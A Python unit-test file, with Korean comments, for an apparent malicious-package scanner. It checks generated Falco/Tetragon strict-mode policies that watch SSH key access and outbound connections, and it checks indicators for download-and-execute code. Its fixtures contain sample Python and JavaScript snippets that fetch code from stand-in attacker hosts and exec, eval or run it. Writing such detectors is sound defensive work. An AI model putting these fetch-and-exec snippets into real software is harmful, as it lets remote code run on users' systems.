"""#R1 generic strict-mode Falco/Tetragon + #Z2 DOW-001/DOW-002 단위 테스트."""
from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pkgsentinel.knowledge.malicious_indicators import INDICATORS
from pkgsentinel.realtime.sinks.falco_policy import (
    FalcoPolicySink,
    TRUSTED_REGISTRY_DOMAINS,
    generate_strict_mode_falco,
    generate_strict_mode_tetragon,
)


# ─────────────── #R1 — strict-mode generators ───────────────

def test_strict_mode_falco_yaml_structure():
    print("== #R1 strict Falco: 필수 룰 4종 포함 ==")
    y = generate_strict_mode_falco()
    # 4 generic rule
    for rule_name in (
        "pkgsentinel_strict_cred_access",
        "pkgsentinel_strict_external_connect",
        "pkgsentinel_strict_shell_in_install",
        "pkgsentinel_strict_persistence_attempt",
    ):
        assert rule_name in y, f"missing rule {rule_name}"
    # priority CRITICAL for cred + connect + persistence
    assert "priority: CRITICAL" in y
    print("  OK 4 strict rules present")


def test_strict_mode_falco_includes_pkg_processes_list():
    print("\n== strict Falco: pip/npm/node 프로세스 리스트 ==")
    y = generate_strict_mode_falco()
    assert "pkgsentinel_pkg_processes" in y
    for proc in ("pip", "npm", "node", "yarn", "pnpm"):
        assert proc in y, f"missing {proc} in package process list"
    print("  OK")


def test_strict_mode_falco_trusted_domains_excluded():
    """trusted registry 는 connect rule 매크로에서 제외돼야."""
    print("\n== strict Falco: 신뢰 도메인 화이트리스트 ==")
    y = generate_strict_mode_falco()
    for d in TRUSTED_REGISTRY_DOMAINS:
        assert d in y, f"trusted domain {d} missing from strict policy"
    print("  OK")


def test_strict_mode_tetragon_yaml_structure():
    print("\n== #R1 strict Tetragon: Sigkill 활성 ==")
    y = generate_strict_mode_tetragon()
    assert "kind: TracingPolicy" in y
    assert "name: pkgsentinel-strict-mode" in y
    assert "action: Sigkill" in y
    # 자격증명 경로 + tcp_connect 둘 다 후킹
    assert "/.ssh/id_rsa" in y
    assert "tcp_connect" in y
    assert "sys_openat" in y
    print("  OK")


def test_strict_mode_tetragon_internal_ip_whitelist():
    print("\n== strict Tetragon: 사설 IP NotDAddr 제외 ==")
    y = generate_strict_mode_tetragon()
    for cidr in ("127.0.0.0/8", "10.0.0.0/8",
                 "172.16.0.0/12", "192.168.0.0/16"):
        assert cidr in y, f"missing CIDR {cidr}"
    print("  OK")


def test_sink_emit_strict_mode_files():
    """FalcoPolicySink(emit_strict_mode=True) 가 추가 파일 dump."""
    print("\n== FalcoPolicySink(emit_strict_mode=True) ==")
    td = tempfile.mkdtemp(prefix="strict_test_")
    try:
        sink = FalcoPolicySink(out_dir=td, emit_strict_mode=True)
        report = {
            "verdict": "MALICIOUS", "package": "evil", "ecosystem": "npm",
            "version": "0.0.1", "evidence": [], "package_meta": {},
        }
        result = sink.emit(report)
        assert "strict_falco" in result
        assert "strict_tetragon" in result
        # 실제 파일 존재
        assert os.path.exists(result["strict_falco"])
        assert os.path.exists(result["strict_tetragon"])
        # 내용
        with open(result["strict_falco"], encoding="utf-8") as f:
            content = f.read()
        assert "pkgsentinel_strict_cred_access" in content
        print("  OK strict files emitted")
    finally:
        import shutil
        shutil.rmtree(td, ignore_errors=True)


def test_sink_emit_no_strict_mode_default():
    """emit_strict_mode=False (기본) 면 strict 파일 안 만들어짐."""
    print("\n== FalcoPolicySink default: no strict files ==")
    td = tempfile.mkdtemp(prefix="strict_test_")
    try:
        sink = FalcoPolicySink(out_dir=td)
        result = sink.emit({
            "verdict": "MALICIOUS", "package": "x", "ecosystem": "npm",
            "version": "1", "evidence": [], "package_meta": {},
        })
        assert "strict_falco" not in result
        print("  OK")
    finally:
        import shutil
        shutil.rmtree(td, ignore_errors=True)


# ─────────────── #Z2 — DOW-001 / DOW-002 ───────────────

def test_dow_001_registered():
    print("\n== #Z2: DOW-001 indicator 등록 ==")
    assert "DOW-001" in INDICATORS
    ind = INDICATORS["DOW-001"]
    assert ind.severity.value.lower() == "high"
    print(f"  OK {ind.name}")


def test_dow_002_registered():
    print("\n== #Z2: DOW-002 indicator 등록 ==")
    assert "DOW-002" in INDICATORS
    assert INDICATORS["DOW-002"].severity.value.lower() == "high"
    print("  OK")


def test_dow_001_matches_python_fetch_exec():
    """Python: requests.get → exec — single file downloader."""
    print("\n== DOW-001 Python: requests.get → exec ==")
    from pkgsentinel.stages.indicator_matcher import _match_from_text
    from pkgsentinel.stages.stage1b_full_source import FullSourceFile

    def _mt(src, path, lang):
        return _match_from_text(FullSourceFile(
            path=path, basename=path.split("/")[-1],
            content=src, size=len(src),
            language=lang, tier=1,
        ))
    src = '''
import requests
r = requests.get("https://attacker.example.com/stage2.py").text
exec(r)
'''
    hits = _mt(src, "evil.py", "python")
    codes = [h.indicator.code for h in hits]
    assert "DOW-001" in codes, f"expected DOW-001 in {codes}"
    print(f"  OK {codes}")


def test_dow_001_matches_js_fetch_eval():
    """JS: fetch + eval pattern."""
    print("\n== DOW-001 JS: fetch → eval ==")
    from pkgsentinel.stages.indicator_matcher import _match_from_text
    from pkgsentinel.stages.stage1b_full_source import FullSourceFile

    def _mt(src, path, lang):
        return _match_from_text(FullSourceFile(
            path=path, basename=path.split("/")[-1],
            content=src, size=len(src),
            language=lang, tier=1,
        ))
    src = '''
fetch("https://evil.com/stage2.js")
  .then(r => r.text())
  .then(t => eval(t));
'''
    hits = _mt(src, "evil.js", "javascript")
    codes = [h.indicator.code for h in hits]
    assert "DOW-001" in codes, f"expected DOW-001 in {codes}"
    print(f"  OK {codes}")


def test_dow_002_matches_write_then_exec():
    """Write fetched payload to disk then execute."""
    print("\n== DOW-002: write → exec ==")
    from pkgsentinel.stages.indicator_matcher import _match_from_text
    from pkgsentinel.stages.stage1b_full_source import FullSourceFile

    def _mt(src, path, lang):
        return _match_from_text(FullSourceFile(
            path=path, basename=path.split("/")[-1],
            content=src, size=len(src),
            language=lang, tier=1,
        ))
    src = '''
import requests, subprocess
data = requests.get("https://evil.example.com/payload").content
open("/tmp/x", "wb").write(data)
subprocess.run(["/tmp/x"])
'''
    hits = _mt(src, "evil.py", "python")
    codes = [h.indicator.code for h in hits]
    assert "DOW-002" in codes, f"expected DOW-002 in {codes}"
    print(f"  OK {codes}")


def test_dow_001_no_match_on_benign_fetch():
    """단순 fetch+parse 는 DOW 매칭 안 함."""
    print("\n== DOW-001 negative: benign fetch+parse ==")
    from pkgsentinel.stages.indicator_matcher import _match_from_text
    from pkgsentinel.stages.stage1b_full_source import FullSourceFile

    def _mt(src, path, lang):
        return _match_from_text(FullSourceFile(
            path=path, basename=path.split("/")[-1],
            content=src, size=len(src),
            language=lang, tier=1,
        ))
    src = '''
import requests, json
r = requests.get("https://api.example.com/data").json()
data = json.loads(r) if isinstance(r, str) else r
print(data["users"])
'''
    hits = _mt(src, "ok.py", "python")
    codes = [h.indicator.code for h in hits]
    assert "DOW-001" not in codes, f"unexpected DOW-001 in {codes}"
    assert "DOW-002" not in codes
    print(f"  OK no false trigger")


def main():
    pass


if __name__ == "__main__":
    main()
